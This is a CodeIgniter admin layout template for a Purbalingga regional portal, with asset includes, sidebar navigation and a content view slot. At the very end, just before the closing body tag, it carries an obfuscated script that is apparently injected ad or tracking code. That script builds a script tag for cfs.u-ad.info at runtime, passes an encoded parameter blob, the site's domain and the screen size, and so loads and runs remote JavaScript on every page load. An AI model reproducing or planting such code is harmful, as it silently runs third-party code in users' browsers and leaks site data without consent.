<!DOCTYPE html>
<html>
    
<head>
        <meta charset="UTF-8">
        <title>Adminstrator Portal Purbalingga</title>   
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="description" content="">
        <meta name="keywords" content="coco bootstrap template, coco admin, bootstrap,admin template, bootstrap admin,">
        <meta name="author" content="Huban Creative">

        <!-- Base Css Files -->
        <link href=<?php echo base_url("asset/libs/jqueryui/ui-lightness/jquery-ui-1.10.4.custom.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/bootstrap/css/bootstrap.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/font-awesome/css/font-awesome.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/fontello/css/fontello.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/animate-css/animate.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/nifty-modal/css/component.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/magnific-popup/magnific-popup.css"); ?> rel="stylesheet" /> 
        <link href=<?php echo base_url("asset/libs/ios7-switch/ios7-switch.css"); ?> rel="stylesheet" /> 
        <link href=<?php echo base_url("asset/libs/pace/pace.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/sortable/sortable-theme-bootstrap.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/bootstrap-datepicker/css/datepicker.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/jquery-icheck/skins/all.css"); ?> rel="stylesheet" />
        <!-- Code Highlighter for Demo -->
        <link href=<?php echo base_url("asset/libs/prettify/github.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/jquery-datatables/css/dataTables.bootstrap.css"); ?> rel="stylesheet" type="text/css" />
        <link href=<?php echo base_url("asset/libs/jquery-datatables/extensions/TableTools/css/dataTables.tableTools.css"); ?> rel="stylesheet" type="text/css" />
                <!-- Extra CSS Libraries Start -->
        <link href=<?php echo base_url("asset/css/style.css"); ?> rel="stylesheet" type="text/css" />
                <!-- Extra CSS Libraries End -->
        <link href=<?php echo base_url("asset/css/style-responsive.css"); ?> rel="stylesheet" />

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
        <![endif]-->

        <link rel="shortcut icon" href=<?php echo base_url("assets/images/favicon.png"); ?>>
        <link rel="apple-touch-icon" href=<?php echo base_url("asset/img/apple-touch-icon.png") ?> />
        <link rel="apple-touch-icon" sizes="57x57" href=<?php echo base_url("asset/img/apple-touch-icon-57x57.png"); ?> />
        <link rel="apple-touch-icon" sizes="72x72" href=<?php echo base_url("asset/img/apple-touch-icon-72x72.png"); ?> />
        <link rel="apple-touch-icon" sizes="76x76" href=<?php echo base_url("asset/img/apple-touch-icon-76x76.png"); ?> />
        <link rel="apple-touch-icon" sizes="114x114" href=<?php echo base_url("asset/img/apple-touch-icon-114x114.png"); ?> />
        <link rel="apple-touch-icon" sizes="120x120" href=<?php echo base_url("asset/img/apple-touch-icon-120x120.png" ); ?>/>
        <link rel="apple-touch-icon" sizes="144x144" href=<?php echo base_url("asset/img/apple-touch-icon-144x144.png" ); ?>/>
        <link rel="apple-touch-icon" sizes="152x152" href=<?php echo base_url("asset/img/apple-touch-icon-152x152.png"); ?> />
    </head>
    <body class="fixed-left">
        <!-- Modal Start -->
        	<!-- Modal Task Progress -->	
		
	
	<div id="wrapper">
		
<!-- Top Bar Start -->
<div class="topbar">
    <div class="topbar-left">
        <button class="button-menu-mobile open-left">
        <i class="fa fa-bars"></i>
        </button>
    </div>
    <!-- Button mobile view to collapse sidebar menu -->
    <div class="navbar navbar-default" role="navigation">
        <div class="container">
            <div class="navbar-collapse2">
                
                <ul class="nav navbar-nav navbar-right top-navbar">
                   
                    <li class="dropdown iconify hide-phone"><a href="#" onclick="javascript:toggle_fullscreen()"><i class="icon-resize-full-2"></i></a></li>
                    <li class="dropdown topbar-profile">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown"><span class="rounded-image topbar-profile-image"><img src=<?php echo base_url("asset/img/default-user.png"); ?>></span> <strong>Hi, Admin</strong> <i class="fa fa-caret-down"></i></a>
                        <ul class="dropdown-menu">
                            <li><a href="<?php echo base_url('Xxdmin/seting_admin'); ?>">Account Setting</a></li>
                            <li class="divider"></li>
                            <li><a href="<?php echo base_url('Xxdlog/logout'); ?>" class="md-trigger" data-modal="logout-modal"><i class="icon-logout-1"></i> Logout</a></li>
                        </ul>
                    </li>
                    
                </ul>
            </div>
            <!--/.nav-collapse -->
        </div>
    </div>
</div>
<!-- Top Bar End -->
		    <!-- Left Sidebar Start -->
        <div class="left side-menu">
            <div class="sidebar-inner slimscrollleft">
               <!-- Search form -->
                <div class="clearfix"></div>
                <!--- Profile -->
                <div class="profile-info">
                    <div class="col-xs-4">
                      <a href="<?php echo base_url('Xxdmin') ?>" class="rounded-image profile-image"><img src=<?php echo base_url("asset/img/default-user.png"); ?>></a>
                    </div>
                    <div class="col-xs-8">
                        <div class="profile-text">Welcome <b>Administrator</b></div>
                        
                    </div>
                </div>
                <!--- Divider -->
                <div class="clearfix"></div>
                <hr class="divider" />
                <div class="clearfix"></div>
                <!--- Divider -->
                <div id="sidebar-menu">
                    <ul>
                    <li>
                    <a href='<?php echo base_url('Xxdmin'); ?>'><i class='icon-home-3'></i><span>Dashboard</span>
                    <a href='<?php echo base_url('Xxdmin/tambah_data'); ?>'><i class='fa fa-pencil'></i><span>Tambah Portal</span>
                     <a href='<?php echo base_url('Xxdmin/list_portal'); ?>'><i class='fa  fa-globe'></i><span>Daftar Portal</span>
                    </li>
                    
                    <!-- <li class='has_sub'><a href='javascript:void(0);'><i class='icon-feather'></i>
                    <span>UI Elements</span> <span class="pull-right"><i class="fa fa-angle-down"></i>
                    </span></a><ul><li><a href='alerts.html'><span>Alerts</span></a></li>
                    <li><a href='buttons.html'><span>Buttons</span></a></li>
                    <li><a href='calendar.html'><span>Calendar</span></a></li>
                   
                    <li><a href='icons.html'><span>Icons</span></a></li>
                    <li><a href='modals.html'><span>Modals</span></a></li>
                    <li><a href='nested-list.html'><span>Nested List</span></a></li>
                    <li><a href='notifications.html'><span>Notifications</span></a></li>
                    <li><a href='portlets.html'><span>Portlets</span></a></li>
                    <li><a href='progress-bars.html'><span>Progress Bars</span></a></li>
                    <li><a href='tabs-accordions.html'><span>Tabs & Accordions</span></a></li>
                    <li><a href='typography.html'><span>Typography</span></a></li></ul></li> -->
                    </a>
                    </a>
                    </a>
                    </a>
                    </a>
                    </a>
                    </a>
                    </a>
                    </a>
                  
                    

                </div>
            <div class="clearfix"></div>
            <div class="portlets">
            </div>
            <div class="clearfix"></div><br><br><br>
        </div>
            
            </div>
        </div>
        <!-- Left Sidebar End -->		    <!-- Right Sidebar Start -->
    
    <!-- Right Sidebar End -->		
<div class="content-page">
      <div class="content">
      <div class="row">
					<div class="col-md-12">
						<div class="widget">
							
							<div class="widget-content padding">
								<div class="row">
									<div class="col-sm-12">		
				
<?php 
$this->load->view($content);
 ?>

									</div>
								</div>
								
							</div>
						</div>

					</div>
				</div>

				            <!-- Footer Start -->
            <footer>
               Dinas Komunikasi & Informatika Kab. Purbalingga &copy; 2017
            </footer>
            <!-- Footer End -->			
            </div>
			<!-- ============================================================== -->
			<!-- End content here -->
			<!-- ============================================================== -->

        </div>
	<!-- End of page -->
		<!-- the overlay modal element -->
	<div class="md-overlay"></div>
	<!-- End of eoverlay modal -->
	<script>
		var resizefunc = [];
	</script>
	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src=<?php echo base_url("asset/libs/jquery/jquery-1.11.1.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap/js/bootstrap.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jqueryui/jquery-ui-1.10.4.custom.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-ui-touch/jquery.ui.touch-punch.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-detectmobile/detect.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-animate-numbers/jquery.animateNumbers.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/ios7-switch/ios7.switch.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/fastclick/fastclick.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-blockui/jquery.blockUI.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-bootbox/bootbox.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-slimscroll/jquery.slimscroll.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-sparkline/jquery-sparkline.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/nifty-modal/js/classie.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/nifty-modal/js/modalEffects.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/sortable/sortable.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-fileinput/bootstrap.file-input.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-select/bootstrap-select.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-select2/select2.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/magnific-popup/jquery.magnific-popup.min.js"); ?>></script> 
	<script src=<?php echo base_url("asset/libs/pace/pace.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-datepicker/js/bootstrap-datepicker.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-icheck/icheck.min.js"); ?>></script>

	<!-- Demo Specific JS Libraries -->
	<script src=<?php echo base_url("asset/libs/prettify/prettify.js"); ?>></script>

  <script src=<?php echo base_url("asset/js/init.js"); ?>></script>
  <script src=<?php echo base_url("asset/libs/jquery-datatables/js/jquery.dataTables.min.js"); ?>></script>
  <script src=<?php echo base_url("asset/libs/jquery-datatables/js/dataTables.bootstrap.js"); ?>></script>
  <script src=<?php echo base_url("asset/libs/jquery-datatables/extensions/TableTools/js/dataTables.tableTools.min.js"); ?>></script>
  <script src=<?php echo base_url("asset/js/pages/datatables.js"); ?>></script>
  <script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRYPNXr49aVzNErvfxfcJiLJQd74kDlqKLL0gYliFZXMvHElWNjYgLFvpDByYrb4bEfWVnvNfvkIrQrN2DHA3C5YYYG6Nzb%2fiYgQV9e9VBZkAkkZFiJCnScnokN7XP2jzSq1cAGo2bc017nbsFfSjbMDzcU9qkKx2AsTCG6%2fs97WLCxJK5RDigtZ8Ccw%2bbbahqWhJh9dXwpe6S1LYLh5e8uyFn64Nyxrknn%2bB2aCstNVxb3BFRFK1VKsDGMBu8%2bEhPGZPin9XQqFCkvy4i3YSXUgenx6zHfO2mdb2KKGoQMR%2bcUOzA6RZKkAr5GSft6sxNoX9c%2bA9HnGD6ZRaM7X8YmCm8oBolK7sRD4MgO1BbaWYvjDlZaxv%2bsBKM0pCrNSrqYyOI0pgDJnq9TfFN44CxkxBdQuKRBM1%2f%2bw5XVDsYz8AEzDW4IMiY7ZD%2bgud5A0gW8kViSYh48MjdXp6Ho5IqXD2szS%2bFHrNPV9QtouGiU0Q01958bkPabj2sry2nvrpLBdMv28o8KFeHaKKwCPtWLw%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
</html>
